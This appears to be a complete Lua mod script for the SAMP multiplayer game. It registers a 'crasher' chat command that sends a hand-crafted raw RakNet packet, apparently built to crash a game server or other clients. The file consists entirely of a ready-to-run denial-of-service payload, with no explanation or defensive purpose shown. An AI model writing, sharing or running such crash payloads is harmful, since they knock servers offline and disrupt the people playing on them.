function main()
    sampRegisterChatCommand("crasher", function()
	
		local bs = raknetNewBitStream()
		
        local bytes = { 20, 50, 104, 127, 255, 191, 134, 0, 0, 0, 16, 112, 45, 0, 0 }
		
        for i = 1, #bytes do raknetBitStreamWriteInt8(bs, bytes[i]) end
		
        raknetSendBitStream(bs)
		
        raknetDeleteBitStream(bs)
    end)
    wait(-1)
end